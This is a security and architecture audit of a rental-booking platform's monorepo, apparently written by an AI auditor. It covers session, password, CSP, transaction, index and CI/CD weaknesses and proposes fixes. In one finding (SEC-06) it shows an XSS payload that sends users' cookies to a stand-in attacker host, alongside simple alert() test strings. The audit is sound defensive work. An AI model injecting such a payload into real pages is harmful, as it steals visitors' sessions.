# MonthlyKey — Enterprise Audit & Specification

**Version:** 2.0  
**Date:** 2026-02-26  
**Auditor:** Manus AI (commissioned by project owner)  
**Scope:** Full monorepo — `server/`, `client/`, `services/hub-api/`, `services/worker/`, `packages/beds24-sdk/`, `drizzle/`  
**Classification:** Internal — Engineering & Leadership

---

## Table of Contents

1. [Executive Summary](#a-executive-summary)
2. [Security Hardening Plan](#b-security-hardening-plan)
3. [Reliability & Scale](#c-reliability--scale)
4. [CI/CD (Enterprise)](#d-cicd-enterprise)
5. [Architecture & API Contracts](#e-architecture--api-contracts)
6. [Coding Standards & Guardrails](#f-coding-standards--guardrails)
7. [Implementation Roadmap (30/60/90 Days)](#g-implementation-roadmap-306090-days)

---

## A) Executive Summary

### Current Maturity Assessment

| Dimension | Rating | Evidence |
|-----------|--------|----------|
| **Security** | ⚠️ Medium-Low | Password minimum is 6 characters. Session tokens last 1 year with no refresh rotation. CSP includes `unsafe-inline` and `unsafe-eval`. No env validation at startup. In-memory rate limiter resets on restart. |
| **Reliability** | ⚠️ Medium | Zero database transactions across the entire codebase — booking + payment writes are non-atomic. In-memory cache means all instances lose state on restart. No health-check beyond HTTP 200 on `/`. |
| **Maintainability** | ✅ Medium-High | Clean monorepo structure with tRPC type safety, Drizzle ORM, and 338 test files. However, 155 `any` type annotations exist in production code and there are zero foreign key constraints in the MySQL schema. |
| **Scalability** | ⚠️ Medium-Low | Single-instance architecture with in-memory cache, in-memory rate limiter, and in-memory prerender cache. No database indexes defined in the schema. Redis is referenced but not actually connected. |

### Top 10 Risks

| # | Risk | Severity | Business Impact |
|---|------|----------|-----------------|
| 1 | **Session tokens valid for 1 year** with no refresh rotation | Critical | A single leaked token grants full account access for 365 days. No way to revoke without server restart. |
| 2 | **Password minimum is 6 characters** — no complexity rules | Critical | Brute-force and credential-stuffing attacks succeed trivially against short passwords. |
| 3 | **Zero database transactions** — booking + payment writes are separate | Critical | A server crash between creating a booking and recording payment leaves orphaned records and financial discrepancy. |
| 4 | **Zero foreign key constraints** in MySQL schema (30+ tables) | High | Orphaned records accumulate silently. Deleting a property does not cascade to bookings, payments, or favorites. |
| 5 | **Zero database indexes** defined in schema | High | Every query on `properties`, `bookings`, `payments` performs full table scans. Performance degrades linearly with data growth. |
| 6 | **In-memory rate limiter** resets on every restart/deploy | High | Attackers can time brute-force attempts around deployments. Rate limits are not shared across instances. |
| 7 | **CSP allows `unsafe-inline` and `unsafe-eval`** | High | XSS payloads can execute inline scripts. The CSP is effectively decorative for script injection attacks. |
| 8 | **No CI/CD pipeline** — no GitHub Actions, no automated tests on PR | High | Regressions ship to production undetected. No gate between `git push` and live deployment. |
| 9 | **No env validation at startup** — missing secrets cause runtime crashes | Medium | A misconfigured deploy can expose stack traces or fail silently on critical paths (JWT, DB, Beds24). |
| 10 | **`dangerouslySetInnerHTML` in Privacy/Terms pages** without sanitization | Medium | If admin-editable content reaches these pages, stored XSS is possible. |

### "If We Do Nothing" Scenario

Within 6–12 months of scaling to 500+ active users and 100+ properties, the platform will experience: (a) a credential-stuffing incident exploiting weak passwords, (b) financial discrepancies from non-atomic booking/payment flows during peak traffic, (c) degraded search performance from missing indexes as the property table grows past 10,000 rows, and (d) inability to scale horizontally because all state is in-memory. The absence of a CI/CD pipeline means each of these issues will be discovered in production rather than in staging.

---

## B) Security Hardening Plan

| ID | Issue | Severity | Exploit Scenario | Fix Design | Effort | Owner | Verification Steps | Rollback Plan |
|----|-------|----------|-----------------|------------|--------|-------|-------------------|---------------|
| **SEC-01** | Session tokens valid for 1 year, no refresh rotation | **Critical** | Attacker obtains a token from browser storage, local network sniffing, or XSS. Token remains valid for 365 days with no revocation mechanism. | Implement dual-token architecture: **access token** (15 min, JWT, stateless) + **refresh token** (30 days, opaque, stored in DB with `refreshTokens` table). Refresh endpoint rotates both tokens. Add `token_version` column to `users` table — incrementing it invalidates all existing refresh tokens for that user. | L | Backend | 1. Verify access token expires after 15 min. 2. Verify refresh token rotates on use. 3. Verify password change increments `token_version` and invalidates all sessions. 4. Verify expired refresh token returns 401. | Keep `ONE_YEAR_MS` constant but gate behind `LEGACY_SESSION=true` env flag. Remove flag after 30-day migration window. |
| **SEC-02** | Password minimum is 6 characters | **Critical** | Automated tools crack 6-char passwords in seconds using dictionary attacks. Credential stuffing from leaked databases succeeds at high rates. | Enforce at registration and password change: minimum 12 characters, at least 1 uppercase, 1 lowercase, 1 digit, 1 special character. Add Zod schema: `z.string().min(12).regex(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/)`. Display strength meter on frontend. Existing users prompted to upgrade on next login. | S | Backend + Frontend | 1. Attempt registration with `abc123` — expect 400. 2. Attempt with `Str0ng!Pass2026` — expect 200. 3. Verify existing users with weak passwords are prompted on login. | Add `ENFORCE_STRONG_PASSWORD=true` env flag. Set to `false` to revert. |
| **SEC-03** | In-memory rate limiter resets on restart | **High** | Attacker monitors deploy schedule (Railway auto-deploys on push). Immediately after deploy, rate limit counters reset to zero, allowing unlimited login attempts. | Replace `server/rate-limiter.ts` with Redis-backed rate limiter using `ioredis` + sliding window algorithm. Counters persist across restarts. Fallback to in-memory if `REDIS_URL` is not set (development mode). | M | Backend + DevOps | 1. Deploy new version. 2. Immediately attempt 11 logins — expect 429 on attempt 11. 3. Verify counters survive `pm2 restart`. | Keep existing `RateLimiter` class as fallback. Gate Redis backend behind `REDIS_URL` env var. |
| **SEC-04** | No env validation at startup | **High** | Deploy with missing `JWT_SECRET` → server starts but all auth operations fail with cryptic errors. Missing `DATABASE_URL` → server starts but all DB queries throw unhandled promise rejections. | Add `server/env.ts` using `zod` to validate all required env vars at startup. If validation fails, log a clear error message and `process.exit(1)` before binding the HTTP port. Required vars: `DATABASE_URL`, `JWT_SECRET`, `NODE_ENV`. Optional with defaults: `PORT`, `REDIS_URL`, `UPLOAD_DIR`. | S | Backend | 1. Remove `JWT_SECRET` from env → expect server to exit with clear error. 2. Set `JWT_SECRET=test` → expect server to warn about weak secret in production. 3. Verify all env vars are documented in `.env.example`. | Wrap validation in try/catch with `SKIP_ENV_VALIDATION=true` escape hatch. |
| **SEC-05** | CSP allows `unsafe-inline` and `unsafe-eval` | **High** | Attacker injects `<script>` tag via stored XSS (e.g., property description, review comment). CSP does not block execution because `unsafe-inline` is permitted. | Remove `unsafe-inline` from `script-src`. Use nonce-based CSP: generate a random nonce per request, inject into `<script nonce="...">` tags, and add `'nonce-{value}'` to CSP header. Remove `unsafe-eval` — audit all dependencies for `eval()` usage (none found in current codebase). For styles, keep `unsafe-inline` temporarily (Tailwind requires it) but plan migration to nonce-based styles. | M | Backend + Frontend | 1. Inject `<script>alert(1)</script>` in a property description field. 2. Verify browser console shows CSP violation. 3. Verify legitimate scripts still execute with nonce. | Add `CSP_REPORT_ONLY=true` env flag to switch to `Content-Security-Policy-Report-Only` header during migration. |
| **SEC-06** | `dangerouslySetInnerHTML` without sanitization | **Medium** | Admin creates a Privacy Policy page containing `<img onerror="fetch('https://evil.com/steal?c='+document.cookie)">`. All users visiting the page have cookies exfiltrated. | Install `dompurify` (or `isomorphic-dompurify` for SSR). Wrap all `dangerouslySetInnerHTML` calls: `dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(content) }}`. Apply to `PrivacyPolicy.tsx` (line 340) and `TermsOfService.tsx` (line 331). | S | Frontend | 1. Insert `<img onerror="alert(1)">` in admin CMS. 2. Visit Privacy Policy page. 3. Verify `onerror` attribute is stripped. | Revert to raw `formatMarkdown()` output if sanitizer causes rendering issues. |
| **SEC-07** | Secret management — no rotation, no validation | **Medium** | JWT secret is set once and never rotated. If compromised, all tokens ever issued are forgeable. No mechanism to detect or respond to secret compromise. | Implement JWT secret rotation: support `JWT_SECRET` (current) + `JWT_SECRET_PREVIOUS` (for verifying old tokens during rotation window). Add startup check: if `JWT_SECRET` length < 32 or equals common defaults (`secret`, `changeme`, `jwt-secret`), refuse to start in production. Document rotation procedure in runbook. | S | Backend + DevOps | 1. Set `JWT_SECRET=changeme` in production → expect startup failure. 2. Set `JWT_SECRET_PREVIOUS` to old secret, `JWT_SECRET` to new secret → verify old tokens still validate during 24h window. | Remove `JWT_SECRET_PREVIOUS` to immediately invalidate old tokens. |
| **SEC-08** | Audit logging — incomplete coverage | **Medium** | Admin deletes a property or changes a user's role. No record exists of who did what, when, or why. Compliance with PDPL requires audit trails for PII access. | Extend `userActivities` table to cover all admin mutations. Add middleware that automatically logs: `timestamp`, `userId`, `action` (CREATE/UPDATE/DELETE), `resourceType`, `resourceId`, `previousValue` (JSON), `newValue` (JSON), `ipAddress`. For the Hub API, the `audit_log` table already exists — ensure all routes write to it. | M | Backend | 1. Admin changes user role → verify `userActivities` row created with old and new role. 2. Admin deletes property → verify log entry with property snapshot. 3. Query audit log for user X's actions in last 7 days → verify completeness. | Audit logging is append-only. Disable by setting `ENABLE_AUDIT_LOG=false` (not recommended). |
| **SEC-09** | CORS configuration audit | **Low** | Current CORS setup not explicitly audited. If `Access-Control-Allow-Origin: *` is set, any website can make authenticated requests to the API. | Audit all CORS middleware. Ensure `origin` is set to the specific production domain(s). Ensure `credentials: true` is only paired with explicit origins, never `*`. Add `ALLOWED_ORIGINS` env var as comma-separated list. | S | Backend | 1. Make fetch request from `https://evil.com` to API → expect CORS rejection. 2. Make request from production domain → expect success. | Revert to permissive CORS with `CORS_PERMISSIVE=true` flag for debugging. |
| **SEC-10** | Dependency vulnerability scanning — none exists | **Medium** | A transitive dependency (76 direct deps, hundreds of transitive) has a known CVE. No automated process detects or alerts on this. | Add `npm audit` to CI pipeline. Add GitHub Dependabot configuration (`.github/dependabot.yml`). Add `pnpm audit --audit-level=high` as a pre-deploy gate. Configure weekly automated PRs for dependency updates. | S | DevOps | 1. Run `pnpm audit` → document current vulnerability count. 2. Verify Dependabot creates PRs for known vulnerabilities. 3. Verify CI fails if `high` or `critical` vulnerabilities are found. | Remove audit step from CI if it blocks critical hotfixes (use `--ignore-advisories` for specific CVEs). |

---

## C) Reliability & Scale

### C.1 Stateless Application Guidance

The current server stores three categories of state in-memory that prevent horizontal scaling:

| State | Location | Impact | Migration Path |
|-------|----------|--------|----------------|
| **Cache** (`server/cache.ts`) | `MemoryCache` class, 50K entry limit | Each instance has its own cache. Writes on instance A are invisible to instance B. | Replace with Redis via `ioredis`. The `CacheBackend` interface already exists — implement `RedisCacheBackend` that calls `redis.get/set/del`. Gate behind `REDIS_URL`. |
| **Rate limiter** (`server/rate-limiter.ts`) | `Map<string, RateLimitEntry>` | Rate limits are per-instance. An attacker hitting different instances gets N × the allowed rate. | Use Redis `INCR` + `EXPIRE` for sliding window. Or use `rate-limit-redis` package with existing `express-rate-limit` in hub-api. |
| **Prerender cache** (`server/middleware/prerender.ts`) | `Map<string, { html, timestamp }>`, 500 entry limit | Duplicate rendering work across instances. Stale content served inconsistently. | Move to Redis with 5-minute TTL. Or use CDN-level caching (Cloudflare) with `Cache-Control: public, max-age=300`. |

**Target state:** Any instance can be killed or replaced without data loss. All shared state lives in Redis or the database.

### C.2 Redis Migration Plan

**Phase 1 (Day 0–30):** Deploy a Redis instance on Railway (or use Railway's built-in Redis add-on). Set `REDIS_URL` env var. Migrate the rate limiter first — it is the highest-risk in-memory state.

**Phase 2 (Day 30–60):** Migrate the main application cache (`server/cache.ts`). The `CacheBackend` interface already supports this — implement `RedisCacheBackend` using `ioredis`. Keep `MemoryCache` as fallback when `REDIS_URL` is absent.

**Phase 3 (Day 60–90):** Migrate prerender cache and session store. Consider using Redis for BullMQ job queues (the worker service already expects Redis via `REDIS_URL`).

### C.3 Background Jobs & Queues

The worker service (`services/worker/src/index.ts`) already uses BullMQ with three queues: `webhook`, `auto-ticket`, and `notification`. However, the `auto-ticket` and `notification` workers contain only TODO stubs.

**Required policies:**

| Policy | Current | Target |
|--------|---------|--------|
| **Retry strategy** | Default BullMQ (exponential backoff) | Explicit: 3 retries with delays of 10s, 60s, 300s. Configurable per queue. |
| **Dead Letter Queue (DLQ)** | None | After max retries, move job to `{queue}:dlq`. Alert via webhook to admin dashboard. |
| **Idempotency** | Hub API has `idempotency_key` on bookings table | Extend to all write operations. Worker checks `idempotencyStore` table before processing. Duplicate jobs are logged and skipped. |
| **Concurrency** | webhook: 5, ticket: 3, notification: 10 | Keep current values. Add `WORKER_CONCURRENCY_{QUEUE}` env vars for runtime tuning. |
| **Monitoring** | Console logs only | Add BullMQ dashboard (Bull Board) on admin route `/admin/queues`. Expose queue depth as Prometheus metric. |

### C.4 Database Transactions

**Zero transactions exist in the codebase.** The following operations MUST be wrapped in transactions:

| Operation | Current Risk | Transaction Scope |
|-----------|-------------|-------------------|
| **Create booking + create payment** | Booking created but payment insert fails → booking exists without payment record | `BEGIN` → insert booking → insert payment → `COMMIT`. On failure, `ROLLBACK` both. |
| **Approve booking + update availability** | Booking approved but availability not updated → double-booking possible | `BEGIN` → update booking status → update `propertyAvailability` → `COMMIT`. |
| **PayPal capture + update payment status** (`updateBookingPayment`) | Payment captured by PayPal but local status not updated → financial discrepancy | `BEGIN` → update payment → update booking status → `COMMIT`. Already partially implemented but not transactional. |
| **Delete property + cascade** | Property deleted but favorites, bookings, reviews remain as orphans | `BEGIN` → delete favorites → delete reviews → soft-delete bookings → delete property → `COMMIT`. |
| **Admin role change + permission update** | Role changed but permissions not updated → inconsistent access | `BEGIN` → update user role → update adminPermissions → `COMMIT`. |

**Implementation pattern using Drizzle ORM:**

```typescript
// In server/db.ts
import { getDb } from "./db";

export async function createBookingWithPayment(
  bookingData: InsertBooking,
  paymentData: InsertPayment
) {
  const db = await getDb();
  return db.transaction(async (tx) => {
    const [booking] = await tx.insert(bookings).values(bookingData);
    const bookingId = booking.insertId;
    await tx.insert(payments).values({ ...paymentData, bookingId });
    return bookingId;
  });
}
```

### C.5 Database Constraints: Foreign Keys & Indexes

**Foreign Keys — Zero exist.** The MySQL schema (`drizzle/schema.ts`) defines 30+ tables with `int("userId")`, `int("propertyId")`, etc., but none use `.references()`. This means:

- Deleting a user does not cascade to their bookings, properties, or messages.
- Inserting a booking with a non-existent `propertyId` succeeds silently.
- Data integrity is enforced only by application code, which is fragile.

**Required foreign keys (priority order):**

| Child Table | Column | Parent Table | On Delete |
|-------------|--------|-------------|-----------|
| `properties` | `landlordId` | `users.id` | RESTRICT |
| `bookings` | `propertyId` | `properties.id` | RESTRICT |
| `bookings` | `tenantId` | `users.id` | RESTRICT |
| `bookings` | `landlordId` | `users.id` | RESTRICT |
| `payments` | `bookingId` | `bookings.id` | CASCADE |
| `payments` | `tenantId` | `users.id` | RESTRICT |
| `favorites` | `userId` | `users.id` | CASCADE |
| `favorites` | `propertyId` | `properties.id` | CASCADE |
| `reviews` | `bookingId` | `bookings.id` | CASCADE |
| `messages` | `conversationId` | `conversations.id` | CASCADE |
| `maintenanceRequests` | `propertyId` | `properties.id` | RESTRICT |
| `notifications` | `userId` | `users.id` | CASCADE |

**Indexes — Zero exist.** Every query performs a full table scan. Required indexes:

| Table | Column(s) | Type | Justification |
|-------|-----------|------|---------------|
| `properties` | `landlordId` | B-tree | Landlord dashboard queries |
| `properties` | `cityId, districtId` | Composite | Search filtering |
| `properties` | `isActive, isFeatured` | Composite | Homepage featured listings |
| `properties` | `monthlyPrice` | B-tree | Price range filtering |
| `properties` | `latitude, longitude` | Spatial (future) | Map-based search |
| `bookings` | `tenantId` | B-tree | Tenant dashboard |
| `bookings` | `landlordId` | B-tree | Landlord dashboard |
| `bookings` | `propertyId` | B-tree | Property booking history |
| `bookings` | `status` | B-tree | Status filtering |
| `payments` | `bookingId` | B-tree | Payment lookup by booking |
| `payments` | `status` | B-tree | Payment status queries |
| `favorites` | `userId, propertyId` | Unique composite | Duplicate prevention + lookup |
| `messages` | `conversationId, createdAt` | Composite | Message thread ordering |
| `userActivities` | `userId, createdAt` | Composite | Activity timeline |
| `platformSettings` | `settingKey` | Unique | Setting lookup (already implicit via PK) |

### C.6 Observability

| Layer | Current State | Target State |
|-------|--------------|--------------|
| **Logging** | `console.log/error` throughout. No structured format. | Use `pino` for structured JSON logs. Include `requestId`, `userId`, `duration`, `statusCode` in every log line. |
| **Tracing** | None | Add OpenTelemetry SDK. Trace requests from Express → tRPC → Drizzle → MySQL. Export to Jaeger or Grafana Tempo. |
| **Metrics** | None | Expose `/metrics` endpoint with Prometheus format. Key metrics: request latency (p50/p95/p99), error rate, DB query duration, cache hit ratio, queue depth. |
| **Error tracking** | `console.error` only | Add Sentry (or Bugsnag). Capture unhandled rejections, tRPC errors, and DB connection failures. Group by error fingerprint. |
| **Alerting** | None | Alert on: error rate > 5%, p95 latency > 2s, queue depth > 100, DB connection pool exhaustion. Channel: Slack webhook or email. |
| **Error budgets** | Not defined | Target: 99.9% availability (8.76h downtime/year). Burn rate alert at 2× (consuming monthly budget in 15 days). |

---

## D) CI/CD (Enterprise)

### D.1 Pipeline Design

No CI/CD pipeline currently exists. Railway auto-deploys on every push to `main`, with no gates, tests, or checks.

**Proposed pipeline (GitHub Actions):**

```
┌─────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│   PR Open    │───▶│  CI Checks   │───▶│   Staging    │───▶│  Production  │
│              │    │              │    │   Deploy     │    │   Deploy     │
└─────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
                          │                    │                    │
                    ┌─────┴─────┐        ┌─────┴─────┐      ┌─────┴─────┐
                    │ Lint      │        │ Smoke test│      │ Canary    │
                    │ Typecheck │        │ DB migrate│      │ Rollback  │
                    │ Unit test │        │ (dry-run) │      │ gate      │
                    │ Audit     │        └───────────┘      └───────────┘
                    │ License   │
                    │ Secret    │
                    │ scan      │
                    └───────────┘
```

### D.2 GitHub Actions Specification

**File: `.github/workflows/ci.yml`**

```yaml
name: CI
on:
  pull_request:
    branches: [main]
  push:
    branches: [main]

env:
  NODE_VERSION: "22"
  PNPM_VERSION: "latest"

jobs:
  lint-and-typecheck:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: pnpm/action-setup@v4
      - uses: actions/setup-node@v4
        with: { node-version: "${{ env.NODE_VERSION }}", cache: "pnpm" }
      - run: pnpm install --frozen-lockfile
      - run: pnpm lint
      - run: pnpm typecheck

  test:
    runs-on: ubuntu-latest
    services:
      mysql:
        image: mysql:8
        env:
          MYSQL_ROOT_PASSWORD: test
          MYSQL_DATABASE: mk_test
        ports: ["3306:3306"]
        options: >-
          --health-cmd="mysqladmin ping"
          --health-interval=10s
          --health-timeout=5s
          --health-retries=3
    steps:
      - uses: actions/checkout@v4
      - uses: pnpm/action-setup@v4
      - uses: actions/setup-node@v4
        with: { node-version: "${{ env.NODE_VERSION }}", cache: "pnpm" }
      - run: pnpm install --frozen-lockfile
      - run: pnpm test
        env:
          DATABASE_URL: mysql://root:test@localhost:3306/mk_test
          JWT_SECRET: ci-test-secret-minimum-32-chars!!

  security-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: pnpm/action-setup@v4
      - uses: actions/setup-node@v4
        with: { node-version: "${{ env.NODE_VERSION }}", cache: "pnpm" }
      - run: pnpm install --frozen-lockfile
      - run: pnpm audit --audit-level=high
      - name: License check
        run: npx license-checker --failOn "GPL-3.0;AGPL-3.0"
      - name: Secret scan
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: ${{ github.event.pull_request.base.sha }}
          head: ${{ github.event.pull_request.head.sha }}

  migration-check:
    runs-on: ubuntu-latest
    if: github.event_name == 'pull_request'
    steps:
      - uses: actions/checkout@v4
      - uses: pnpm/action-setup@v4
      - uses: actions/setup-node@v4
        with: { node-version: "${{ env.NODE_VERSION }}", cache: "pnpm" }
      - run: pnpm install --frozen-lockfile
      - name: Check for pending migrations
        run: |
          npx drizzle-kit generate --dry-run 2>&1 | tee migration-output.txt
          if grep -q "No schema changes" migration-output.txt; then
            echo "No new migrations needed"
          else
            echo "⚠️ New migration detected — review carefully"
            cat migration-output.txt
          fi
```

**File: `.github/workflows/deploy-staging.yml`**

```yaml
name: Deploy Staging
on:
  push:
    branches: [staging]

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: staging
    steps:
      - uses: actions/checkout@v4
      - name: Deploy to Railway (staging)
        uses: bervProject/railway-deploy@main
        with:
          railway_token: ${{ secrets.RAILWAY_TOKEN_STAGING }}
          service: mk-staging
      - name: Smoke test
        run: |
          sleep 30
          curl -f https://mk-staging.up.railway.app/api/trpc/siteSettings.getAll || exit 1
          echo "Smoke test passed"
```

**File: `.github/workflows/deploy-production.yml`**

```yaml
name: Deploy Production
on:
  release:
    types: [published]

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: actions/checkout@v4
      - name: Deploy to Railway (production)
        uses: bervProject/railway-deploy@main
        with:
          railway_token: ${{ secrets.RAILWAY_TOKEN_PRODUCTION }}
          service: mk-production
      - name: Post-deploy health check
        run: |
          for i in 1 2 3 4 5; do
            sleep 15
            STATUS=$(curl -s -o /dev/null -w "%{http_code}" https://monthly-key-app-production.up.railway.app/)
            if [ "$STATUS" = "200" ]; then
              echo "Health check passed (attempt $i)"
              exit 0
            fi
            echo "Health check failed (attempt $i, status $STATUS)"
          done
          echo "CRITICAL: Production health check failed after 5 attempts"
          exit 1
```

### D.3 Required Secrets

| Secret | Where | Purpose |
|--------|-------|---------|
| `RAILWAY_TOKEN_STAGING` | GitHub Environments → staging | Railway deploy token for staging service |
| `RAILWAY_TOKEN_PRODUCTION` | GitHub Environments → production | Railway deploy token for production service |
| `SENTRY_DSN` | GitHub Secrets | Error tracking (when implemented) |
| `SLACK_WEBHOOK_URL` | GitHub Secrets | Deploy notifications |

### D.4 Migration Safety

Database migrations run automatically on startup via `start.sh` (`npx drizzle-kit migrate`). This is acceptable for small teams but risky at scale.

**Safety rules:**

1. **Never drop columns or tables in a single migration.** Use a two-phase approach: Phase 1 — stop writing to the column. Phase 2 (next release) — drop the column.
2. **Always make migrations backward-compatible.** The old code must work with the new schema during rolling deploys.
3. **Test migrations against a production-size dataset** before deploying. Use `mysqldump` to create a staging copy.
4. **Add `-- drizzle:safe` comment** to migrations that are verified safe. CI can flag migrations without this comment.

---

## E) Architecture & API Contracts

### E.1 Public vs Internal API Boundaries

| Boundary | Consumers | Auth | Rate Limit | Versioned |
|----------|-----------|------|-----------|-----------|
| **Public tRPC** (`/api/trpc/`) | Browser SPA | Cookie-based JWT | Yes (per-IP) | No (tRPC is typed, not versioned) |
| **Public REST** (`/api/auth/*`) | Browser SPA | None (login) / Cookie (change-password) | Yes (strict: 10/5min) | Should be versioned (`/api/v1/auth/*`) |
| **Hub API** (`/api/v1/*`) | Sister products, adapters | Bearer JWT / API key | Yes (express-rate-limit) | Yes (v1 prefix) |
| **Internal** (worker ↔ hub-api) | Worker service | Service-to-service token | No (internal network) | No |
| **Beds24 SDK** | Server-side only | Refresh token → access token | Beds24's own limits | N/A (external API) |

**Rule:** No internal endpoint should be accessible from the public internet. Hub API endpoints that are meant for service-to-service communication should require an API key header (`X-API-Key`) in addition to JWT.

### E.2 Versioning Policy

The Hub API already uses `/api/v1/` prefix. The main application's tRPC API does not use versioning because tRPC provides compile-time type safety between client and server in the same monorepo.

**Policy:**

- **Hub API:** Semantic versioning. Breaking changes increment the major version (`/api/v2/`). Old versions supported for 6 months after deprecation notice.
- **tRPC API:** No URL versioning needed. Breaking changes are caught by TypeScript at build time. Use feature flags for gradual rollouts.
- **Webhook payloads:** Include a `version` field in every payload. Consumers specify which version they accept when subscribing.

### E.3 Error Code Conventions

**Current state:** Errors are returned as `{ error: "string message" }` with no structured code. This makes client-side error handling fragile and i18n-unfriendly.

**Target convention:**

```json
{
  "code": "BOOKING_CONFLICT",
  "message": "The selected dates overlap with an existing booking",
  "messageAr": "التواريخ المحددة تتعارض مع حجز موجود",
  "details": {
    "conflictingBookingId": 42,
    "conflictingDates": { "checkIn": "2026-03-01", "checkOut": "2026-03-31" }
  }
}
```

**Error code namespaces:**

| Namespace | Example Codes | HTTP Status |
|-----------|--------------|-------------|
| `AUTH_*` | `AUTH_INVALID_CREDENTIALS`, `AUTH_TOKEN_EXPIRED`, `AUTH_WEAK_PASSWORD` | 401, 403 |
| `VALIDATION_*` | `VALIDATION_REQUIRED_FIELD`, `VALIDATION_INVALID_FORMAT` | 400 |
| `BOOKING_*` | `BOOKING_CONFLICT`, `BOOKING_NOT_FOUND`, `BOOKING_ALREADY_CANCELLED` | 409, 404 |
| `PAYMENT_*` | `PAYMENT_FAILED`, `PAYMENT_ALREADY_CAPTURED` | 402, 409 |
| `RATE_LIMIT_*` | `RATE_LIMIT_EXCEEDED` | 429 |
| `INTERNAL_*` | `INTERNAL_SERVER_ERROR`, `INTERNAL_DB_ERROR` | 500 |

### E.4 i18n Rules (AR/EN) and RTL/LTR

**Current implementation:** The client uses a custom `useI18n()` hook with inline translations. The server returns bilingual fields (`titleAr`/`titleEn`, `descriptionAr`/`descriptionEn`).

**Rules:**

1. **Arabic is the primary language.** All new features must have Arabic translations before merge.
2. **No mixed-language fields.** A field is either `titleAr` (Arabic only) or `titleEn` (English only). Never store both languages in one field.
3. **RTL is the default layout direction.** Use CSS logical properties (`margin-inline-start` instead of `margin-left`). Test every page in both directions.
4. **Error messages must be bilingual.** The `messageAr` field is required in all error responses.
5. **Date formatting:** Use `Intl.DateTimeFormat` with `ar-SA` locale for Arabic, `en-SA` for English. Hijri calendar support is deferred to Phase 3.
6. **Currency:** Always display as `SAR` with proper formatting. Arabic: `١٬٥٠٠٫٠٠ ر.س`. English: `SAR 1,500.00`.
7. **Phone numbers:** Always store in E.164 format (`+9665XXXXXXXX`). Display with local formatting.

### E.5 Feature Flag Governance

The Hub API has a `featureFlags` table with in-memory cache (30s TTL). The main application uses `platformSettings` for feature toggles.

**Naming convention:**

```
ENABLE_{FEATURE}_{SCOPE}
```

Examples: `ENABLE_WHATSAPP_WIDGET`, `ENABLE_BEDS24_SYNC`, `ENABLE_PAYPAL_PAYMENTS`, `ENABLE_AI_ASSISTANT`.

**Governance rules:**

1. **All new features ship behind a flag.** Default: `false` in production, `true` in staging.
2. **Flags have an owner** (the engineer who created them) and an **expiry date** (max 90 days). After expiry, the flag must be removed and the feature either fully enabled or deleted.
3. **Flag changes are audit-logged.** The `userActivities` table records who toggled what and when.
4. **No flag nesting.** A feature should not depend on multiple flags. If it does, create a single parent flag.

---

## F) Coding Standards & Guardrails

### F.1 Folder Conventions

```
mk-repo/
├── client/                    # React SPA
│   ├── src/
│   │   ├── pages/             # Page-level components (one per route)
│   │   ├── components/        # Reusable UI components
│   │   │   └── ui/            # shadcn/ui primitives
│   │   ├── contexts/          # React contexts
│   │   ├── hooks/             # Custom React hooks
│   │   ├── lib/               # Utility helpers (i18n, formatting, etc.)
│   │   ├── App.tsx            # Routes & layout
│   │   ├── main.tsx           # Entry point
│   │   └── index.css          # Global styles & design tokens
│   └── public/                # Static assets (hashed filenames)
├── server/
│   ├── _core/                 # Server bootstrap (auth, cookies, startup)
│   ├── middleware/             # Express middleware (security, prerender)
│   ├── routers.ts             # tRPC router definitions
│   ├── db.ts                  # Database access layer
│   ├── cache.ts               # Cache abstraction
│   ├── permissions.ts         # RBAC enforcement
│   ├── rate-limiter.ts        # Rate limiting
│   └── seed-*.ts              # Data seeding scripts
├── drizzle/
│   ├── schema.ts              # Database schema (single source of truth)
│   └── migrations/            # Generated migration files
├── services/
│   ├── hub-api/               # Cross-product integration API (PostgreSQL)
│   ├── worker/                # Background job processor (BullMQ)
│   ├── cobnb-adapter-api/     # Cobnb channel adapter
│   └── monthlykey-adapter-api/# MonthlyKey adapter for Hub
├── packages/
│   └── beds24-sdk/            # Shared Beds24 API wrapper
├── docs/                      # Architecture docs, audits, specs
├── Dockerfile                 # Multi-stage production build
├── railway.toml               # Railway deployment config
└── start.sh                   # Startup script (migrate + run)
```

**Rules:**

- **One file per concern.** Do not put multiple unrelated functions in `db.ts` (currently 1600+ lines). Split into `db/users.ts`, `db/properties.ts`, `db/bookings.ts`, etc.
- **No business logic in routers.** Routers validate input and call service functions. Service functions contain business logic and call DB functions.
- **No direct DB access from components.** Always go through tRPC.

### F.2 PR Checklist

Every pull request must include the following in its description:

```markdown
## PR Checklist

- [ ] TypeScript: `pnpm typecheck` passes with zero errors
- [ ] Lint: `pnpm lint` passes with zero warnings
- [ ] Tests: All existing tests pass. New tests added for new logic.
- [ ] i18n: All user-facing strings have Arabic translations
- [ ] RTL: Tested in both RTL (Arabic) and LTR (English) layouts
- [ ] Mobile: Tested on mobile viewport (375px width)
- [ ] Accessibility: Interactive elements have `aria-label` or visible label
- [ ] Security: No secrets in code. No `eval()`. No `dangerouslySetInnerHTML` without sanitization.
- [ ] Migration: If schema changed, migration is backward-compatible
- [ ] Beds24: No changes to Beds24 SDK or integration contracts
- [ ] Feature flag: New features are behind a flag (default: false)
- [ ] Documentation: Updated relevant docs if architecture changed
```

### F.3 "No Breaking Changes" Rules for Integrations

The Beds24 integration is the most fragile external dependency. Rules:

1. **Never modify the Beds24 SDK's public API** without updating all consumers (hub-api, adapters).
2. **Never change webhook payload shapes** without a versioned migration path.
3. **Never change the Hub API's response format** for existing endpoints. Add new fields; never remove or rename existing ones.
4. **All Beds24 API calls must go through the SDK.** No direct `fetch()` calls to `api.beds24.com` from application code.
5. **Token refresh is handled exclusively by `Beds24TokenManager`.** No manual token management elsewhere.

### F.4 Testing Pyramid

| Level | Current | Target | Tools | Coverage Target |
|-------|---------|--------|-------|----------------|
| **Unit** | 338 test files (unclear coverage) | Core business logic: booking rules, payment calculations, permission checks | Vitest | 80% of `server/db.ts` and `server/routers.ts` |
